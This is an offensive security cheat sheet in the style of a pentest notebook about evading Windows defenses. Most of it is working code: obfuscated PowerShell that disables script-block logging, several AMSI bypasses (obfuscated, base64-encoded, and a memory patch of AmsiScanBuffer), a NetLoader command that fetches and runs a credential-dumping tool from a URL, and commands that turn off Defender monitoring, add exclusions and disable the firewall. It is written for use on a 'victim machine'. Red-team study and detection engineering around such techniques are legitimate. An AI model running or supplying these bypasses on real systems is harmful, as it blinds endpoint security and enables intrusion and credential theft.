# Bypass Defenses

## Script-Block Logging Bypass

{% code overflow="wrap" %}
```aspnet
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```
{% endcode %}

Keep this in a file and use **HFS** to request those in the victim machine.

## AMSI Bypass

### PowerShell AMSI Bypass Old 

{% tabs %}
{% tab title="Obfuscated" %}
{% code overflow="wrap" fullWidth="false" %}
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
{% endcode %}
{% endtab %}

### PowerShell AMSI Bypass New 2026
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

{% tab title="Base64" %}
<pre class="language-powershell"><code class="lang-powershell"><strong>[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
</strong></code></pre>
{% endtab %}
{% endtabs %}

### .NET AMSI Bypass

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

### Invisi-Shell

{% embed url="https://github.com/OmerYa/Invisi-Shell" %}

Invisi-Shell bypasses all of PowerShell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking.

```powershell
# With admin privileges:
RunWithPathAsAdmin.bat 

# More Silent
# With non-admin privileges:
RunWithRegistryNonAdmin.bat

# Type exit from the new PowerShell session to complete the clean-up.
exit
```

### Loader

Use [`NetLoader` ](https://github.com/Flangvik/NetLoader)to unhook ETW and patch AMSI then run executable from URL without saving. Use port forwarder instead of running them directly. Otherwise, this triggers Defender’s behavior-based detection: executable downloaded from remote web server. Read more inside [#http-server](transfer-files.md#http-server "mention")

```powershell
NetLoader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

## Windows Defender

> **Note:** If Tamper protection is enabled you will not be able to turn off Defender by CMD or PowerShell. You can however, still create an exclusion.

Check Windows Defender Status with `Get-MpComputerStatus`

Disable real time monitoring. Need local admin access.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Disable scanning for downloaded files (more silent and preferred)

```powershell
Set-MpPreference -DisableIOAVProtection $true
```

Create an exclusion if nothing works.

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

## AppLocker

### List AppLocker Rules

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Test AppLocker Policy

{% code fullWidth="false" %}
```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
{% endcode %}

## Firewall

> **Note:** requires Admin privileges.

Disable using PowerShell

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

Disable manually

<figure><img src="../.gitbook/assets/disable-firewall.png" alt=""><figcaption></figcaption></figure>

## AV Signatures Bypass

### AMSITrigger

identify the part of a script is detected

{% embed url="https://github.com/RythmStick/AMSITrigger" %}
AMSITrigger
{% endembed %}

Usage:

```powershell
AmsiTrigger_x64.exe -i PowerUp.ps1 
```

Example for scanning

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Example for bypassing

<pre class="language-powershell"><code class="lang-powershell"><strong># Reverse the "Net.Sockets" string
</strong>
<strong>$String = "stekcoS.teN"
</strong>$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
 $client = New-Object System.$class.TCPClient($IPAddress,$Port)
}
</code></pre>

### DefenderChecker

Identify code and strings from a binary / file that Windows Defender may flag

{% embed url="https://github.com/t3hbb/DefenderCheck" %}
DefenderChecker
{% endembed %}

Usage:

```powershell
DefenderCheck.exe PowerUp.ps1 
```

### Extra Tools

1. Invoke-Obfuscation - [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
2. ByteToLineNumber.ps1 - Available inside _Tools_ Folder
3. Codecepticon(For Source Code) - [https://github.com/Accenture/Codecepticon](https://github.com/Accenture/Codecepticon)
4. ConfuserEX - [https://github.com/mkaring/ConfuserEx](https://github.com/mkaring/ConfuserEx)
5. LOLBAS - [https://github.com/LOLBAS-Project/LOLBAS?tab=readme-ov-file](https://github.com/LOLBAS-Project/LOLBAS?tab=readme-ov-file)
6. GPOddity - [https://github.com/synacktiv/GPOddity](https://github.com/synacktiv/GPOddity)
